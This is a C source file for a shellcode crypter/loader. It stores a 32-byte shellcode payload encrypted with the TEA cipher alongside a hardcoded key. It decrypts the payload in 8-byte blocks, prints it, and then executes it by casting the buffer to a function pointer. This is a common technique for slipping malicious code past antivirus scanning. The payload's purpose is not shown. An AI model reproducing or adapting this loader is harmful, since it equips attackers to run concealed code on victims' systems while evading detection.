#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "TEA.h"

#define BLOCK_SIZE	8


// shellcode, should be processed in 64 bit blocks
unsigned char pEncryptedShellcode[] =
"\x63\x21\xeb\x6a\x81\x1b\x06\x2f\x23\x03\x5b\xb2\xfe\xfc\xd6\x3f\x79\xda\x02\x63\xf3\x0d\xfb\x76\x07\x0c\xba\xae\x4b\xf2\xef\xb2";

// 128 bit key
unsigned char pKey[] = "sup3rs3cr3tp4ss1";


void printByteArray(unsigned char* byteArray, int size)
{
	int i;
	for (i=0; i<size; i++)
	{
		printf("\\x%02x", byteArray[i]);
	}
	printf("\n");
}


int main(int argc, char **argv)
{
	int i;
	int encryptedShellcodeSize;

	unsigned char* pEncryptedShellcodePos;

	encryptedShellcodeSize = sizeof(pEncryptedShellcode) - 1;


        // Print the encrypted shellcode and size
        printf("Encrypted shellcode: ");
        printByteArray(pEncryptedShellcode, encryptedShellcodeSize);
        printf("Encrypted shellcode size: %d\n\n", encryptedShellcodeSize);


	// Decrypt shellcode
	pEncryptedShellcodePos = pEncryptedShellcode;
	while (pEncryptedShellcodePos - pEncryptedShellcode < encryptedShellcodeSize)
	{
		TEA_decrypt((uint32_t *) pEncryptedShellcodePos, (uint32_t *) pKey);
		pEncryptedShellcodePos += BLOCK_SIZE;
	}


	// Print the original shellcode
	printf("Original shellcode: ");
	printByteArray(pEncryptedShellcode, encryptedShellcodeSize);


	// Execute decrypted shellcode
	int (*ret)() = (int(*)()) pEncryptedShellcode;
	ret();


	return 0;
}

